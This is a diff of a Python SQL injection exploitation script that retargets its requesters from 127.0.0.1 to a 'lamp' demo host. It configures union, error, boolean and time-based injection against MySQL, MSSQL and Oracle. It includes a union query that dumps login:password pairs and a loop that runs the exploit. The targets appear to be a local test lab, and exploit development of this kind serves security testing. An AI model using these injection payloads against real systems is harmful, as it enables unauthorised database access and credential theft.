@@ -36,7 +36,7 @@ def mysql_union():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=0${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=mysql&id=0${injection}',
       method = 'GET',
       response_processor = extract_results,
       encode_payload = quote,
@@ -67,7 +67,7 @@ def mysql_error():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=mysql&id=1${injection}',
       method = 'GET',
       response_processor = extract_results,
       encode_payload = quote,
@@ -81,7 +81,7 @@ def mysql_boolean():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql',
+      url = 'http://lamp/demo/sqli.php?dbms=mysql',
       body = 'id=1${injection}',
       method = 'POST',
       response_processor = test_state_grep,
@@ -97,7 +97,7 @@ def mysql_boolean_regexp():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql',
+      url = 'http://lamp/demo/sqli.php?dbms=mysql',
       body = 'id=1${injection}',
       method = 'POST',
       response_processor = test_state_grep,
@@ -113,7 +113,7 @@ def mysql_boolean_binary():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql',
+      url = 'http://lamp/demo/sqli.php?dbms=mysql',
       body = 'id=1${injection}',
       method = 'POST',
       response_processor = test_state_grep,
@@ -131,7 +131,7 @@ def mysql_time():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mysql&id=1${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=mysql&id=1${injection}',
       method = 'GET',
       response_processor = test_state_time,
       encode_payload = quote,
@@ -148,13 +148,13 @@ def mssql_union():
   select login,first_name from blah..users where user_id=0 union all select ':ABC:'+X+':ABC:',null FROM (SELECT TOP 10 login+':'+password X FROM blah..users WHERE login+':'+password NOT IN (SELECT TOP 0 login+':'+password FROM blah..users))a
   '''
 
-  template = " union all select ':ABC:'+X+':ABC:',null from ${query}"
+  template = " union all select null,':ABC:'+X+':ABC:' from ${query}"
 
   def make_requester():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=0${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=mssql&id=0${injection}',
       method = 'GET',
       response_processor = extract_results,
       encode_payload = quote,
@@ -174,7 +174,7 @@ def mssql_error():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=mssql&id=1${injection}',
       method = 'GET',
       response_processor = extract_results,
       encode_payload = quote,
@@ -190,7 +190,7 @@ def mssql_boolean():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=mssql&id=1${injection}',
       method = 'GET',
       response_processor = test_state_grep,
       encode_payload = quote,
@@ -206,7 +206,7 @@ def mssql_time():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1/demo/sqli.php?dbms=mssql&id=1${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=mssql&id=1${injection}',
       method = 'GET',
       response_processor = test_state_time,
       encode_payload = quote,
@@ -229,7 +229,7 @@ def oracle_union():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1:18080/demo/sqli.php?dbms=oracle&id=0${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=oracle&id=0${injection}',
       method = 'GET',
       response_processor = extract_results,
       encode_payload = quote,
@@ -255,7 +255,7 @@ def oracle_error():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1:18080/demo/sqli.php?dbms=oracle&id=1${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=oracle&id=1${injection}',
       method = 'GET',
       response_processor = extract_results,
       encode_payload = quote,
@@ -271,7 +271,7 @@ def oracle_boolean():
     return Requester_HTTP(
       proxies = PROXIES,
       headers = HEADERS,
-      url = 'http://127.0.0.1:18080/demo/sqli.php?dbms=oracle&id=1${injection}',
+      url = 'http://lamp/demo/sqli.php?dbms=oracle&id=1${injection}',
       method = 'GET',
       response_processor = test_state_grep,
       encode_payload = quote,
@@ -294,11 +294,11 @@ sqli = MySQL_Inband(mysql_union())
 
 #sqli = MSSQL_Inband(mssql_union())
 #sqli = MSSQL_Inband(mssql_error())
-#sqli = MSSQL_Inband(mssql_boolean())
-#sqli = MSSQL_Inband(mssql_time())
+#sqli = MSSQL_Blind(mssql_boolean())
+#sqli = MSSQL_Blind(mssql_time())
 
 #sqli = Oracle_Inband(oracle_union())
-#sqli = Oracle_Inband(oracle_error())
+##sqli = Oracle_Inband(oracle_error())
 #sqli = Oracle_Blind(oracle_boolean())
 
 for r in sqli.exploit():
